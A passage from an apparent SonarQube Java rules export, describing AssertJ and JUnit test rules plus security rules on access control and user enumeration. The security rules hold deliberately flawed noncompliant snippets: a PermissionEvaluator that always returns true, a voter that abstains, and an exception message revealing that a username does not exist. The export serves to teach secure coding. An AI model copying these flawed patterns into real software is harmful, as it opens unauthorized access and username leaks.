issue when any of the methods listed are used without asserting that the list is empty or not and without testing the\ncontent.</p>\n<p>Targetted methods:</p>\n<ul>\n  <li> <code>allMatch</code> </li>\n  <li> <code>allSatisfy</code> </li>\n  <li> <code>doesNotContain</code> </li>\n  <li> <code>doesNotContainSequence</code> </li>\n  <li> <code>doesNotContainSubsequence</code> </li>\n  <li> <code>doesNotContainAnyElementsOf</code> </li>\n</ul>\n<h3>Noncompliant code example</h3>\n<pre>\nList&lt;String&gt; logs = getLogs();\n\nassertThat(logs).allMatch(e -&gt; e.contains(âerrorâ)); // Noncompliant, this test pass if logs are empty!\nassertThat(logs).doesNotContain(\"error\"); // Noncompliant, do you expect any log?\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nList&lt;String&gt; logs = getLogs();\n\nassertThat(logs).isNotEmpty().allMatch(e -&gt; e.contains(âerrorâ));\n// Or\nassertThat(logs).hasSize(5).allMatch(e -&gt; e.contains(âerrorâ));\n// Or\nassertThat(logs).isEmpty();\n\n// Despite being redundant, this is also acceptable since it explains why you expect an empty list\nassertThat(logs).doesNotContain(\"error\").isEmpty();\n// or test the content of the list further\nassertThat(logs).contains(\"warning\").doesNotContain(\"error\");\n</pre>\n\n","impacts":[{"name":"reliability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5841","summary":"AssertJ assertions \"allMatch\" and \"doesNotContains\" should also test for emptiness","tags":["tests","assertj"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>AssertJ contains many assertions methods specific to common types. Both versions will test the same things, but the dedicated one will provide a\nbetter error message, simplifying the debugging process.</p>\n<p>This rule reports an issue when an assertion can be simplified to a dedicated one.</p>\n<p>The array below gives a non-exhaustive list of assertion reported by the rule. Code behaving similarly, or with a negation will also be\nreported.</p>\n<table>\n  <colgroup>\n    <col style=\"width: 50%;\">\n    <col style=\"width: 50%;\">\n  </colgroup>\n  <thead>\n    <tr>\n      <th>Original</th>\n      <th>Dedicated</th>\n    </tr>\n  </thead>\n  <tbody>\n    <tr>\n      <td><p><strong>Related to Object</strong></p></td>\n      <td></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getObject()).isEqualTo(null)</code></p></td>\n      <td><p><code>assertThat(getObject()).isNull()</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getBoolean()).isEqualTo(true)</code></p></td>\n      <td><p><code>assertThat(getBoolean()).isTrue()</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getBoolean()).isEqualTo(false)</code></p></td>\n      <td><p><code>assertThat(getBoolean()).isFalse()</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(x.equals(y)).isTrue()</code></p></td>\n      <td><p><code>assertThat(x).isEqualTo(y)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(x == y).isTrue()</code></p></td>\n      <td><p><code>assertThat(x).isSameAs(y)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(x == null).isTrue()</code></p></td>\n      <td><p><code>assertThat(x).isNull()</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(x.toString()).isEqualTo(y)</code></p></td>\n      <td><p><code>assertThat(x).hasToString(y)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(x.hashCode()).isEqualTo(y.hashCode())</code></p></td>\n      <td><p><code>assertThat(x).hasSameHashCodeAs(y)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getObject() instanceof MyClass).isTrue()</code></p></td>\n      <td><p><code>assertThat(getObject()).isInstanceOf(MyClass.class)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><strong>Related to <code>Comparable</code></strong></p></td>\n      <td></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(x.compareTo(y)).isZero()</code></p></td>\n      <td><p><code>assertThat(x).isEqualByComparingTo(y)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(x &gt;= y).isTrue()</code></p></td>\n      <td><p><code>assertThat(x).isGreaterThanOrEqualTo(y)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(x &gt; y).isTrue()</code></p></td>\n      <td><p><code>assertThat(x).isGreaterThan(y)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(x &lt;= y).isTrue()</code></p></td>\n      <td><p><code>assertThat(x).isLessThanOrEqualTo(y)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(x &lt; y).isTrue()</code></p></td>\n      <td><p><code>assertThat(x).isLessThan(y)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><strong>Related to <code>String</code></strong></p></td>\n      <td></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getString().isEmpty()).isTrue()</code></p></td>\n      <td><p><code>assertThat(getString()).isEmpty()</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getString()).hasSize(0)</code></p></td>\n      <td><p><code>assertThat(getString()).isEmpty()</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getString().equals(expected)).isTrue()</code></p></td>\n      <td><p><code>assertThat(getString()).isEqualTo(expected)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getString().equalsIgnoreCase(expected)).isTrue()</code></p></td>\n      <td><p><code>assertThat(getString()).isEqualToIgnoringCase(expected)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getString().contains(expected)).isTrue()</code></p></td>\n      <td><p><code>assertThat(getString()).contains(expected)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getString().startsWith(expected)).isTrue()</code></p></td>\n      <td><p><code>assertThat(getString()).startsWith(expected)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getString().endsWith(expected)).isTrue()</code></p></td>\n      <td><p><code>assertThat(getString()).endsWith(expected)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getString().matches(expected)).isTrue()</code></p></td>\n      <td><p><code>assertThat(getString()).matches(expected)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getString().trim()).isEmpty()</code></p></td>\n      <td><p><code>assertThat(getString()).isBlank()</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getString().length()).isEqualTo(length)</code></p></td>\n      <td><p><code>assertThat(getString()).hasSize(length)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getString().length()).hasSize(expected.length())</code></p></td>\n      <td><p><code>assertThat(getString()).hasSameSizeAs(expected)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><strong>&nbsp;Related to <code>File</code></strong></p></td>\n      <td></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getFile()).hasSize(0)</code></p></td>\n      <td><p><code>assertThat(getFile()).isEmpty()</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getFile().length()).isZero()</code></p></td>\n      <td><p><code>assertThat(getFile()).isEmpty()</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getFile().length()).isEqualTo(length)</code></p></td>\n      <td><p><code>assertThat(getFile()).hasSize(length)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getFile().canRead()).isTrue()</code></p></td>\n      <td><p><code>assertThat(getFile()).canRead()</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getFile().canWrite()).isTrue()</code></p></td>\n      <td><p><code>assertThat(getFile()).canWrite()</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getFile().exists()).isTrue()</code></p></td>\n      <td><p><code>assertThat(getFile()).exists()</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getFile().getName()).isEqualTo(name)</code></p></td>\n      <td><p><code>assertThat(getFile()).hasName(name)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getFile().getParent()).isEqualTo(pathname)</code></p></td>\n      <td><p><code>assertThat(getFile()).hasParent(pathname)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getFile().getParentFile()).isNull()</code></p></td>\n      <td><p><code>assertThat(getFile()).hasNoParent()</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getFile().isAbsolute()).isTrue()</code></p></td>\n      <td><p><code>assertThat(getFile()).isAbsolute()</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getFile().isAbsolute()).isFalse()</code></p></td>\n      <td><p><code>assertThat(getFile()).isRelative()</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getFile().isDirectory()).isTrue()</code></p></td>\n      <td><p><code>assertThat(getFile()).isDirectory()</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getFile().isFile()).isTrue()</code></p></td>\n      <td><p><code>assertThat(getFile()).isFile()</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getFile().list()).isEmpty()</code></p></td>\n      <td><p><code>assertThat(getFile()).isEmptyDirectory()</code></p></td>\n    </tr>\n    <tr>\n      <td><p><strong>&nbsp;Related to <code>Path</code></strong></p></td>\n      <td></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getPath().startsWith(path)).isTrue()</code></p></td>\n      <td><p><code>assertThat(getPath()).startsWithRaw(path)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getPath().endsWith(path)).isTrue()</code></p></td>\n      <td><p><code>assertThat(getPath()).endsWithRaw(path)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getPath().getParent()).isEqualTo(name)</code></p></td>\n      <td><p><code>assertThat(getPath()).hasParentRaw(name)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getPath().getParent()).isNull()</code></p></td>\n      <td><p><code>assertThat(getPath()).hasNoParentRaw()</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getPath().isAbsolute()).isTrue()</code></p></td>\n      <td><p><code>assertThat(getPath()).isAbsolute()</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getPath().isAbsolute()).isFalse()</code></p></td>\n      <td><p><code>assertThat(getPath()).isRelative()</code></p></td>\n    </tr>\n    <tr>\n      <td><p><strong>&nbsp;Related to <code>Array</code></strong></p></td>\n      <td></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getArray().length).isZero()</code></p></td>\n      <td><p><code>assertThat(getArray()).isEmpty()</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getArray().length).isEqualTo(length)</code></p></td>\n      <td><p><code>assertThat(getArray()).hasSize(length)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getArray().length).isEqualTo(anotherArray.length)</code></p></td>\n      <td><p><code>assertThat(getArray()).hasSameSizeAs(anotherArray)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getArray().length).isLessThanOrEqualTo(expression)</code></p></td>\n      <td><p><code>assertThat(getArray()).hasSizeLessThanOrEqualTo(expression)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getArray().length).isLessThan(expression)</code></p></td>\n      <td><p><code>assertThat(getArray()).hasSizeLessThan(expression)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getArray().length).isGreaterThan(expression)</code></p></td>\n      <td><p><code>assertThat(getArray()).hasSizeGreaterThan(expression)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getArray().length).isGreaterThanOrEqualTo(expression)</code></p></td>\n      <td><p><code>assertThat(getArray()).hasSizeGreaterThanOrEqualTo(expression)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><strong>Related to <code>Collection</code></strong></p></td>\n      <td></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getCollection().isEmpty()).isTrue()</code></p></td>\n      <td><p><code>assertThat(getCollection()).isEmpty()</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getCollection().size()).isZero()</code></p></td>\n      <td><p><code>assertThat(getCollection()).isEmpty()</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getCollection().contains(something)).isTrue()</code></p></td>\n      <td><p><code>assertThat(getCollection()).contains(something)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getCollection().containsAll(otherCollection)).isTrue()</code></p></td>\n      <td><p><code>assertThat(getCollection()).containsAll(otherCollection)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><strong>Related to <code>Map</code></strong></p></td>\n      <td></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getMap().size()).isEqualTo(otherMap().size()</code></p></td>\n      <td><p><code>assertThat(getMap()).hasSameSizeAs(otherMap())</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getMap().containsKey(key)).isTrue()</code></p></td>\n      <td><p><code>assertThat(getMap()).containsKey(key)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getMap().keySet()).contains(key)</code></p></td>\n      <td><p><code>assertThat(getMap()).containsKey(key)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getMap().keySet()).containsOnlyKey(key)</code></p></td>\n      <td><p><code>assertThat(getMap()).containsOnlyKey(key)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getMap().containsValue(value)).isTrue()</code></p></td>\n      <td><p><code>assertThat(getMap()).containsValue(value)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getMap().values()).contains(value)</code></p></td>\n      <td><p><code>assertThat(getMap()).containsValue(value)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getMap().get(key)).isEqualTo(value)</code></p></td>\n      <td><p><code>assertThat(getMap()).containsEntry(key, value)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><strong>Related to <code>Optional</code></strong></p></td>\n      <td></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getOptional().isPresent()).isTrue()</code></p></td>\n      <td><p><code>assertThat(getOptional()).isPresent()</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getOptional().get()).isEqualTo(something)</code></p></td>\n      <td><p><code>assertThat(getOptional()).contains(something)</code></p></td>\n    </tr>\n    <tr>\n      <td><p><code>assertThat(getOptional().get()).isSameAs(something)</code></p></td>\n      <td><p><code>assertThat(getOptional()).containsSame(something)</code></p></td>\n    </tr>\n  </tbody>\n</table>\n<h3>Noncompliant code example</h3>\n<pre>\nassertThat(getObject()).isEqualTo(null); // Noncompliant\nassertThat(getObject()).isNotEqualTo(null); // Noncompliant - not listed above but also supported\n\nassertThat(getString().trim()).isEmpty();\nassertThat(getFile().canRead()).isTrue();\nassertThat(getPath().getParent()).isNull();\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nassertThat(getObject()).isNull();\nassertThat(getObject()).isNotNull();\n\nassertThat(getString()).isBlank();\nassertThat(getFile()).canRead();\nassertThat(getPath()).hasNoParentRaw();\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"partial","ruleKey":"RSPEC-5838","summary":"Chained AssertJ assertions should be simplified to the corresponding dedicated assertion","tags":["tests","assertj"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Describing, setting error message or adding a comparator in <a href=\"https://assertj.github.io/doc/\">AssertJ</a> must be done before calling the\nassertion, otherwise, settings will not be taken into account.</p>\n<p>This rule raises an issue when one of the method (with all similar methods):</p>\n<ul>\n  <li> <code>as</code> </li>\n  <li> <code>describedAs</code> </li>\n  <li> <code>withFailMessage</code> </li>\n  <li> <code>overridingErrorMessage</code> </li>\n  <li> <code>usingComparator</code> </li>\n  <li> <code>usingElementComparator</code> </li>\n  <li> <code>extracting</code> </li>\n  <li> <code>filteredOn</code> </li>\n</ul>\n<p>is called without calling an AssertJ assertion afterward.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nassertThat(actual).isEqualTo(expected).as(\"Description\"); // Noncompliant\nassertThat(actual).isEqualTo(expected).withFailMessage(\"Fail message\"); // Noncompliant\nassertThat(actual).isEqualTo(expected).usingComparator(new CustomComparator()); // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nassertThat(actual).as(\"Description\").isEqualTo(expected);\nassertThat(actual).withFailMessage(\"Fail message\").isEqualTo(expected);\nassertThat(actual).usingComparator(new CustomComparator()).isEqualTo(expected);\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://assertj.github.io/doc/#calling-as-after-the-assertion\">AssertJ incorrect usage documentation</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5833","summary":"AssertJ methods setting the assertion context should come before an assertion","tags":["tests","assertj"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>A <code>org.assertj.core.configuration.Configuration</code> will be effective only once you call <code>Configuration.apply()</code> or\n<code>Configuration.applyAndDisplay()</code>.</p>\n<p>This rule raises an issue when configurations are set without the appropriate call to apply them.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nConfiguration configuration = new Configuration(); // Noncompliant, this configuration will not be applied.\nconfiguration.setComparingPrivateFields(true);\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nConfiguration configuration = new Configuration();\nconfiguration.setComparingPrivateFields(true);\nconfiguration.applyAndDisplay();\n// Alternatively: configuration.apply();\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://assertj.github.io/doc/#assertj-configuration\">AssertJ configuration documentation</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5831","summary":"AssertJ configuration should be applied","tags":["tests","assertj"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>The <code>setUp()</code> and <code>tearDown()</code> methods (initially introduced with JUnit3 to execute a block of code before and after each\ntest) need to be correctly annotated with the equivalent annotation in order to preserve the same behavior when migrating from JUnit3 to JUnit4 or\nJUnit5.</p>\n<p>This rule consequently raise issues on <code>setUp()</code> and <code>tearDown()</code> methods which are not annotated in test classes.</p>\n<h3>Noncompliant code example</h3>\n<ul>\n  <li> JUnit4: </li>\n</ul>\n<pre>\npublic void setUp() { ... } // Noncompliant; should be annotated with @Before\npublic void tearDown() { ... }  // Noncompliant; should be annotated with @After\n</pre>\n<ul>\n  <li> JUnit5: </li>\n</ul>\n<pre>\npublic void setUp() { ... } // Noncompliant; should be annotated with @BeforeEach\npublic void tearDown() { ... }  // Noncompliant; should be annotated with @AfterEach\n</pre>\n<h3>Compliant solution</h3>\n<ul>\n  <li> JUnit4: </li>\n</ul>\n<pre>\n@Before\npublic void setUp() { ... }\n\n@After\npublic void tearDown() { ... }\n</pre>\n<ul>\n  <li> JUnit5: </li>\n</ul>\n<pre>\n@BeforeEach\nvoid setUp() { ... }\n\n@AfterEach\nvoid tearDown() { ... }\n</pre>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5826","summary":"Methods setUp() and tearDown() should be correctly annotated starting with JUnit4","tags":["junit","tests"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>JUnit5 is more tolerant regarding the visibilities of Test classes and methods than JUnit4, which required everything to be public. JUnit5 supports\ndefault package, public and protected visibility, even if it is recommended to use the default package visibility, which improves the readability of\ncode.</p>\n<p>But JUnit5 ignores without any warning:</p>\n<ul>\n  <li> private classes and private methods </li>\n  <li> static methods </li>\n  <li> methods returning a value without being a TestFactory </li>\n</ul>\n<h3>Noncompliant code example</h3>\n<pre>\nimport org.junit.jupiter.api.Test;\n\nclass MyClassTest {\n  @Test\n  private void test1() { // Noncompliant - ignored by JUnit5\n    // ...\n  }\n  @Test\n  static void test2() { // Noncompliant - ignored by JUnit5\n    // ...\n  }\n  @Test\n  boolean test3() { // Noncompliant - ignored by JUnit5\n    // ...\n  }\n  @Nested\n  private class MyNestedClass { // Noncompliant - ignored by JUnit5\n    @Test\n    void test() {\n      // ...\n    }\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nimport org.junit.jupiter.api.Test;\n\nclass MyClassTest {\n  @Test\n  void test1() {\n    // ...\n  }\n  @Test\n  void test2() {\n    // ...\n  }\n  @Test\n  void test3() {\n    // ...\n  }\n  @Nested\n  class MyNestedClass {\n    @Test\n    void test() {\n      // ...\n    }\n  }\n}\n</pre>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-5810","summary":"JUnit5 test classes and methods should not be silently ignored","tags":["junit","tests"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"TESTED","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>When granting users access to resources of an application, such an authorization should be based on strong decisions. For instance, a user may be\nauthorized to access a resource only if they are authenticated, or if they have the correct role and privileges.</p>\n<h2>Why is this an issue?</h2>\n<p>Access control is a critical aspect of web frameworks that ensures proper authorization and restricts access to sensitive resources or actions. To\nenable access control, web frameworks offer components that are responsible for evaluating user permissions and making access control decisions. They\nmight examine the userâs credentials, such as roles or privileges, and compare them against predefined rules or policies to determine whether the user\nshould be granted access to a specific resource or action.</p>\n<p>Conventionally, these checks should never grant access to every request received. If an endpoint or component is meant to be public, then it should\nbe ignored by access control components. Conversely, if an endpoint should deny some users from accessing it, then access control has to be configured\ncorrectly for this endpoint.</p>\n<p>Granting unrestricted access to all users can lead to security vulnerabilities and potential misuse of critical functionalities. It is important to\ncarefully assess access decisions based on factors such as user roles, resource sensitivity, and business requirements. Implementing a robust and\ngranular access control mechanism is crucial for the security and integrity of the web application itself and its surrounding environment.</p>\n<h3>What is the potential impact?</h3>\n<p>Not verifying user access strictly can introduce significant security risks. Some of the most prominent risks are listed below. Depending on the\nuse case, it is very likely that other risks are introduced on top of the ones listed.</p>\n<h4>Unauthorized access</h4>\n<p>As the access of users is not checked strictly, it becomes very easy for an attacker to gain access to restricted areas or functionalities,\npotentially compromising the confidentiality, integrity, and availability of sensitive resources. They may exploit this access to perform malicious\nactions, such as modifying or deleting data, impersonating legitimate users, or gaining administrative privileges, ultimately compromising the\nsecurity of the system.</p>\n<h4>Theft of sensitive data</h4>\n<p>Theft of sensitive data can result from incorrect access control if attackers manage to gain access to databases, file systems, or other storage\nmechanisms where sensitive data is stored. This can lead to the theft of personally identifiable information (PII), financial data, intellectual\nproperty, or other confidential information. The stolen data can be used for various malicious purposes, such as identity theft, financial fraud, or\nselling the data on the black market, causing significant harm to individuals and organizations affected by the breach.</p>\n<h2>How to fix it in Spring</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>The <code>vote</code> method of an <a\nhref=\"https://docs.spring.io/spring-security/site/docs/6.1.x/api/org/springframework/security/access/AccessDecisionVoter.html\">AccessDecisionVoter</a>\nimplementation is not compliant when it returns only an affirmative decision (<code>ACCESS_GRANTED</code>) or abstains to make a decision\n(<code>ACCESS_ABSTAIN</code>):</p>\n<pre data-diff-id=\"101\" data-diff-type=\"noncompliant\">\npublic class WeakNightVoter implements AccessDecisionVoter {\n    @Override\n    public int vote(Authentication authentication, Object object, Collection collection) {\n        Calendar calendar = Calendar.getInstance();\n        int currentHour = calendar.get(Calendar.HOUR_OF_DAY);\n\n        if (currentHour &gt;= 8 &amp;&amp; currentHour &lt;= 19) {\n            return ACCESS_GRANTED;\n        }\n\n        return ACCESS_ABSTAIN; // Noncompliant: when users connect during the night, no decision is made\n    }\n}\n</pre>\n<p>The <code>hasPermission</code> method of a <a\nhref=\"https://docs.spring.io/spring-security/site/docs/6.1.x/api/org/springframework/security/access/PermissionEvaluator.html\">PermissionEvaluator</a>\nimplementation is not compliant when it doesnât return <code>false</code>:</p>\n<pre data-diff-id=\"102\" data-diff-type=\"noncompliant\">\npublic class MyPermissionEvaluator implements PermissionEvaluator {\n    @Override\n    public boolean hasPermission(Authentication authentication, Object targetDomainObject, Object permission) {\n        Object user = authentication.getPrincipal();\n\n        if (user.getRole().equals(permission)) {\n              return true;\n        }\n\n        return true; // Noncompliant\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>The <code>vote</code> method of an <a\nhref=\"https://docs.spring.io/spring-security/site/docs/4.0.x/apidocs/org/springframework/security/access/AccessDecisionVoter.html\">AccessDecisionVoter</a>\nimplementation should return a negative decision (<code>ACCESS_DENIED</code>):</p>\n<pre data-diff-id=\"101\" data-diff-type=\"compliant\">\npublic class StrongNightVoter implements AccessDecisionVoter {\n    @Override\n    public int vote(Authentication authentication, Object object, Collection collection) {\n        Calendar calendar = Calendar.getInstance();\n        int currentHour = calendar.get(Calendar.HOUR_OF_DAY);\n\n        if (currentHour &gt;= 8 &amp;&amp; currentHour &lt;= 19) {\n            return ACCESS_GRANTED;\n        }\n\n        return ACCESS_DENIED; // Users are not allowed to connect during the night\n    }\n}\n</pre>\n<p>The <code>hasPermission</code> method of a <a\nhref=\"https://docs.spring.io/spring-security/site/docs/4.2.13.RELEASE/apidocs/org/springframework/security/access/PermissionEvaluator.html\">PermissionEvaluator</a>\nimplementation should return <code>false</code>:</p>\n<pre data-diff-id=\"102\" data-diff-type=\"compliant\">\npublic class MyPermissionEvaluator implements PermissionEvaluator {\n    @Override\n    public boolean hasPermission(Authentication authentication, Object targetDomainObject, Object permission) {\n        Object user = authentication.getPrincipal();\n\n        if (user.getRole().equals(permission)) {\n              return true;\n        }\n\n        return false;\n    }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/285\">CWE-285 - Improper Authorization</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-5808","summary":"Authorizations should be based on strong decisions","tags":["cwe"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Vulnerability"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>User enumeration refers to the ability to guess existing usernames in a web application database. This can happen, for example, when using\n\"sign-in/sign-on/forgot password\" functionalities of a website.</p>\n<p>When an user tries to \"sign-in\" to a website with an incorrect username/login, the web application should not disclose that the username doesnât\nexist with a message similar to \"this username is incorrect\", instead a generic message should be used like \"bad credentials\", this way itâs not\npossible to guess whether the username or password was incorrect during the authentication.</p>\n<p>If a user-management feature discloses information about the existence of a username, attackers can use brute force attacks to retrieve a large\namount of valid usernames that will impact the privacy of corresponding users and facilitate other attacks (phishing, password guessing etc â¦â).</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The application discloses that a username exists in its database: most of the time itâs possible to avoid this kind of leak except for the\n  \"registration/sign-on\" part of a website because in this case the user must choose a valid username (not already taken by another user). </li>\n  <li> There is no rate limiting and CAPTCHA protection in place for requests involving a username. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>When a user performs a request involving a username, it should not be possible to spot differences between a valid and incorrect username:</p>\n<ul>\n  <li> Error messages should be generic and not disclose if the username is valid or not. </li>\n  <li> The response time must be similar for a valid username or not. </li>\n  <li> CAPTCHA and other rate limiting solutions should be implemented. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>In a Spring-security web application the username leaks when:</p>\n<ul>\n  <li> The string used as argument of <a\n  href=\"https://docs.spring.io/spring-security/site/docs/current/api/org/springframework/security/core/userdetails/UserDetailsService.html\">loadUserByUsername</a> method is used in an exception message: </li>\n</ul>\n<pre>\npublic String authenticate(String username, String password) {\n  // ....\n  MyUserDetailsService s1 = new MyUserDetailsService();\n  MyUserPrincipal u1 = s1.loadUserByUsername(username);\n\n  if(u1 == null) {\n    throw new BadCredentialsException(username+\" doesn't exist in our database\"); // Sensitive\n  }\n  // ....\n}\n</pre>\n<ul>\n  <li> <a\n  href=\"https://docs.spring.io/spring-security/site/docs/3.0.x/apidocs/org/springframework/security/core/userdetails/UsernameNotFoundException.html\">UsernameNotFoundException</a> is thrown (except when it is in the loadUserByUsername method): 